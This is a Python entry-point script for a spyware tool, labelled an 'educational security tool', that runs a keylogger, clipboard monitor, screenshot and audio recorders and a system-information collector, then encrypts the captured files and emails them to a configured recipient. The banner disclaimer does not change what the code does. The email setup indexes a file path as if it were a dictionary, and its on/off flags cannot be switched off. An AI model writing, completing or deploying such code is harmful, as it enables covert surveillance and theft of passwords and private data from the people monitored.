import time
import os
import argparse
import threading
import json
from modules.keylogger import KeyLogger
from modules.system_info import SystemInfoCollector
from modules.clipboard_monitor import ClipboardMonitor
from modules.screenshot import ScreenshotRecorder
from modules.audio_recorder import AudioRecorder
from modules.encryption import Encryptor
from modules.reporting import EmailReporter
import sys

def get_base_path():
    """Get the base path for the application regardless of how it's run."""
    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle (pyinstaller)
        return os.path.dirname(sys.executable)
    else:
        # If running in a normal Python environment
        return os.path.dirname(os.path.abspath(__file__))

def create_output_directory(directory="output"):
    """Create a directory for output files."""
    base_dir = get_base_path()  # Get correct base directory
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    
    # Create absolute path for output
    output_dir = os.path.join(base_dir, directory, timestamp)
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def main():
    # Print ethical reminder
    print("="*80)
    print("EDUCATIONAL SECURITY TOOL - FOR AUTHORIZED USE ONLY")
    print("Only use on systems you own or have explicit permission to test")
    print("="*80)
    
    parser = argparse.ArgumentParser(description="Security Education Tool")
    parser.add_argument("--duration", type=int, default=60, 
                        help="Duration to run in seconds (default: 60)")
    parser.add_argument("--email", action="store_true", default=True,
                        help="Enable email reporting (requires configuration)")
    parser.add_argument("--encrypt", action="store_true", default=True,
                        help="Encrypt output files")
    parser.add_argument("--clipboard", action="store_true", default=True,
                        help="Enable clipboard monitoring")
    parser.add_argument("--screenshots", action="store_true", default=True,
                        help="Enable screenshot capture")
    parser.add_argument("--audio", action="store_true", default=True,
                        help="Enable audio recording")
    args = parser.parse_args()
    
    # Create output directory
    output_dir = create_output_directory()
    print(f"Output will be saved to: {output_dir}")
    
    # Initialize components
    active_modules = []
    
    # System information collection
    sys_info = SystemInfoCollector(os.path.join(output_dir, "system_info.json"))
    sys_info.collect_info()
    
    # Keylogger
    keylogger = KeyLogger(os.path.join(output_dir, "keylog.txt")).start()
    active_modules.append(keylogger)
    
    # Clipboard monitoring
    if args.clipboard:
        clipboard = ClipboardMonitor(os.path.join(output_dir, "clipboard_data.txt")).start()
        active_modules.append(clipboard)
    
    # Screenshot recording
    if args.screenshots:
        screenshots_dir = os.path.join(output_dir, "screenshots")
        screenshots = ScreenshotRecorder(screenshots_dir, interval=5).start()
        active_modules.append(screenshots)
    
    # Audio recording
    if args.audio:
        audio_dir = os.path.join(output_dir, "audio")
        audio = AudioRecorder(audio_dir, duration=10).start()
        active_modules.append(audio)
    
    # Email reporting
    reporter = None
    if args.email:
        # Use your actual email credentials
        config = os.path.join(get_base_path(), "config.json")
        try:
            reporter = EmailReporter(
                smtp_server=config["smtp_server"],
                smtp_port=config["smtp_port"],
                sender_email=config["sender_email"],
                sender_password=config["sender_password"],
                recipient_email=config["recipient_email"],
                interval=60
            )
            
            if reporter.configured:
                reporter.start(output_dir)
                active_modules.append(reporter)
                print("Email reporting configured and started")
            else:
                print("Email reporting not started - missing credentials")
        except Exception as e:
            print(f"Error loading email config: {e}")
            #print(f"Tried to load config from: {config_path}")
            args.email = False  # Disable email if config fails
    
    # Main execution loop
    print(f"Running for {args.duration} seconds...")
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("Operation interrupted by user")
    finally:
        # Stop all active modules
        for module in active_modules:
            module.stop()
        
        print(f"Data collection completed. Check {output_dir} for results.")
        
        # Encrypt output if requested
        if args.encrypt:
            encryptor = Encryptor(os.path.join(output_dir, "encryption.key"))
            
            # Walk through all files in the output directory
            for root, _, files in os.walk(output_dir):
                for filename in files:
                    # Skip already encrypted files and the key file
                    if filename.endswith(".enc") or filename == "encryption.key":
                        continue
                    
                    file_path = os.path.join(root, filename)
                    encryptor.encrypt_file(file_path)
            
            print(f"All files encrypted. Key saved to {os.path.join(output_dir, 'encryption.key')}")
        # ✅ Şifreleme bittikten sonra e-posta gönder

        if args.email and reporter and reporter.configured:
            print("Sending final email report...")
            reporter.send_report(output_dir)    
if __name__ == "__main__":
    main()